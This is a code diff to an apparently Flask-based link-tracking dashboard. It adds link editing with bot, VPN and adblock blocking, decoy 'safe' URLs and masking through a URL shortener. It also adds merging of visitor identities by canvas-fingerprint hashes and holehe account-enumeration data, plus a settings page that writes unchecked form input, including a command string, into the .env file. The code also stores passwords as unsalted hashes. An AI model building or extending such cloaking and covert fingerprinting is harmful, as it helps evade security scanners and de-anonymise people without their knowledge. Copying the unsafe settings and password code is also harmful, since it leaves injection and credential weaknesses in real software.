@@ -142,6 +142,49 @@ def delete_link(id):
         flash('Link deleted', 'success')
     return redirect(url_for('dashboard.dashboard_home'))
 
+@bp.route('/edit/<slug>', methods=['GET', 'POST'])
+@login_required
+def edit_link(slug):
+    """Edit an existing link."""
+    link = Link.query.filter_by(slug=slug).first_or_404()
+    
+    if request.method == 'POST':
+        link.destination = request.form.get('destination')
+        link.ios_url = request.form.get('ios_url') or None
+        link.android_url = request.form.get('android_url') or None
+        link.safe_url = request.form.get('safe_url') or None
+        link.block_bots = request.form.get('block_bots') == 'true'
+        link.block_vpn = request.form.get('block_vpn') == 'true'
+        link.block_adblock = request.form.get('block_adblock') == 'true'
+        link.allow_no_js = request.form.get('allow_no_js') == 'true'
+        link.enable_captcha = request.form.get('enable_captcha') == 'true'
+        link.require_email = request.form.get('require_email') == 'true'
+        link.email_policy = request.form.get('email_policy', 'all')
+        link.allowed_countries = request.form.get('allowed_countries') or None
+        link.schedule_start_hour = int(request.form.get('schedule_start_hour')) if request.form.get('schedule_start_hour') else None
+        link.schedule_end_hour = int(request.form.get('schedule_end_hour')) if request.form.get('schedule_end_hour') else None
+        link.schedule_timezone = request.form.get('schedule_timezone') or 'UTC'
+        link.max_clicks = int(request.form.get('max_clicks') or 0)
+        link.expiration_minutes = int(request.form.get('expiration_minutes') or 0)
+        
+        # Password
+        new_pass = request.form.get('password')
+        if new_pass and new_pass != '***':
+            import hashlib
+            link.password_hash = hashlib.sha256(new_pass.encode()).hexdigest()
+        
+        # Regenerate mask
+        if request.form.get('regenerate_mask'):
+            full_url = f"{Config.SERVER_URL}/{link.slug}"
+            masked = shorten_with_isgd(full_url)
+            if masked: link.public_masked_url = masked
+        
+        db.session.commit()
+        flash('Link updated.', 'success')
+        return redirect(url_for('dashboard.stats', slug=link.slug))
+    
+    return render_template('edit.html', link=link, server_url=Config.SERVER_URL)
+
 @bp.route('/contacts', methods=['GET', 'POST'])
 @login_required
 def contacts():
@@ -163,6 +206,88 @@ def contacts():
 
     leads = Lead.query.order_by(Lead.created_at.desc()).all()
     return render_template('contacts.html', leads=leads)
+
+# ============================================
+# V35: IDENTITY MERGE
+# ============================================
+
+@bp.route('/merge_candidates')
+@login_required
+def merge_candidates():
+    """Find potential duplicate leads based on canvas hash correlation."""
+    # Find all emails with canvas hashes
+    from collections import defaultdict
+    
+    hash_to_emails = defaultdict(set)
+    visits = Visit.query.filter(Visit.canvas_hash != None, Visit.email != None).all()
+    
+    for v in visits:
+        hash_to_emails[v.canvas_hash].add(v.email)
+    
+    # Find hashes with multiple emails (potential same person)
+    merge_candidates = []
+    for canvas_hash, emails in hash_to_emails.items():
+        if len(emails) > 1:
+            leads = Lead.query.filter(Lead.email.in_(list(emails))).all()
+            if len(leads) > 1:
+                merge_candidates.append({
+                    'canvas_hash': canvas_hash[:16],
+                    'leads': leads
+                })
+    
+    return render_template('merge_candidates.html', candidates=merge_candidates)
+
+@bp.route('/merge_leads', methods=['POST'])
+@login_required
+def merge_leads():
+    """Merge multiple leads into one primary lead."""
+    primary_id = request.form.get('primary_id')
+    secondary_ids = request.form.getlist('secondary_ids')
+    
+    if not primary_id or not secondary_ids:
+        flash('Select a primary lead and at least one secondary.', 'error')
+        return redirect(url_for('dashboard.merge_candidates'))
+    
+    primary = Lead.query.get(int(primary_id))
+    if not primary:
+        flash('Primary lead not found.', 'error')
+        return redirect(url_for('dashboard.merge_candidates'))
+    
+    merged_count = 0
+    for sec_id in secondary_ids:
+        secondary = Lead.query.get(int(sec_id))
+        if secondary and secondary.id != primary.id:
+            # Transfer visits
+            Visit.query.filter_by(email=secondary.email).update({'email': primary.email})
+            
+            # Merge data
+            if secondary.name and not primary.name:
+                primary.name = secondary.name
+            if secondary.holehe_data and not primary.holehe_data:
+                primary.holehe_data = secondary.holehe_data
+            if secondary.tags:
+                existing_tags = set((primary.tags or '').split(','))
+                new_tags = set(secondary.tags.split(','))
+                primary.tags = ', '.join(existing_tags.union(new_tags))
+            
+            # Merge custom_fields
+            import json
+            try:
+                primary_cf = json.loads(primary.custom_fields or '{}')
+                secondary_cf = json.loads(secondary.custom_fields or '{}')
+                for k, v in secondary_cf.items():
+                    if k not in primary_cf:
+                        primary_cf[k] = v
+                primary.custom_fields = json.dumps(primary_cf)
+            except: pass
+            
+            # Delete secondary
+            db.session.delete(secondary)
+            merged_count += 1
+    
+    db.session.commit()
+    flash(f'Merged {merged_count} leads into {primary.email}.', 'success')
+    return redirect(url_for('dashboard.lead_profile', lead_id=primary.id))
 
 @bp.route('/contacts/export_csv')
 @login_required
@@ -446,7 +571,44 @@ def ai_auto_tag_all():
 @login_required
 def settings():
     if request.method == 'POST':
-        flash('Settings updated (Env file write simulated).', 'success')
+        import os
+        env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.env')
+        
+        # Read current env
+        env_lines = []
+        if os.path.exists(env_path):
+            with open(env_path, 'r') as f:
+                env_lines = f.readlines()
+        
+        # Update values
+        updates = {
+            'API_KEY': request.form.get('api_key'),
+            'SERVER_URL': request.form.get('server_url'),
+            'HOLEHE_CMD': request.form.get('holehe_cmd'),
+            'GEMINI_MODEL': request.form.get('gemini_model'),
+            'AI_PROMPT': request.form.get('ai_prompt', '').replace('\n', '\\n')
+        }
+        
+        # Update or add each key
+        for key, value in updates.items():
+            if value:
+                found = False
+                for i, line in enumerate(env_lines):
+                    if line.startswith(f'{key}='):
+                        env_lines[i] = f'{key}={value}\n'
+                        found = True
+                        break
+                if not found:
+                    env_lines.append(f'{key}={value}\n')
+        
+        # Write back
+        try:
+            with open(env_path, 'w') as f:
+                f.writelines(env_lines)
+            flash('Settings saved to .env. Restart server to apply changes.', 'success')
+        except Exception as e:
+            flash(f'Error writing .env: {e}', 'error')
+        
     return render_template('settings.html', 
                           api_key=Config.API_KEY, 
                           server_url=Config.SERVER_URL,
